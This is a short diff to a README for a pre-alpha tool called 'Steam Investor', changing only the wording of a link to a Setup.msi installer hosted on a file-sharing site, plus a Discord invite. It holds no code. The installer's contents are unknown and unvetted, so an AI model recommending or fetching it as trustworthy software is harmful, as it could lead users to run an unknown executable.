@@ -1,4 +1,4 @@
-# [Dowload](http://download1649.mediafire.com/5kb5pe5967lg/si5ku94ddr7848g/Setup.msi) Steam Investor v1  (Pre-Aplha!)
+# [Dowload here](http://download1649.mediafire.com/5kb5pe5967lg/si5ku94ddr7848g/Setup.msi) Steam Investor v1  (Pre-Aplha!)
  
 Join the [Discord](https://discord.gg/x4kuTWW) if you have any questions or problems.
 
